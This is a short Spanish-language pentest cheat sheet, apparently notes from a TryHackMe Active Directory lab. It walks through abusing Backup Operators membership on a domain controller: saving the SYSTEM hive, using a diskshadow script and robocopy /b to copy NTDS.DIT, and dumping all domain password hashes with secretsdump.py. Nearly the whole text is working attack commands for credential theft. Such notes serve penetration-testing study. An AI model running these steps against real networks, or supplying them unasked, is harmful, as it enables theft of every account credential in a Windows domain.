** Backup Operators **
https://faisalfs10x.github.io/thm/AttacktiveDirectory

Atacando Kerberos con ASREPRoasting y abusando del grupo de operadores de respaldo para extraer NTDS.DIT

1. Copiar SYSTEM en la máquina objetivo --> `reg save HKLM\SYSTEM system`
2. Extraer NTDS.DIT con Diskshadow:
	* Crear archivo data en local. Se debe dejar un espacio en blanco tras cada línea para que funcione correctamente.
		```
		set content persistent nowriters 
		add volume c: alias pwned 
		create 
		expose %pwned% z: 
		```
	* Subir archivo data a la máquina objetivo.
	* Diskshadow para ejecutar el fichero data:
	* `diskshadow.exe /s data`
	* `copy z:\windows\ntds\ntds.dit C:\Users\SVC_backup\Desktop\backup\ntds.dit`
	* Bypassear Access Denied:
	* `robocopy /b z:\windows\ntds . ntds.dit`
	* Descargar system y ntds.dit en la máquina local (atacante).
1. Dumpear hashes del ntds.dit --> `secretsdump.py -system system -ntds ntds.dit LOCAL`



	

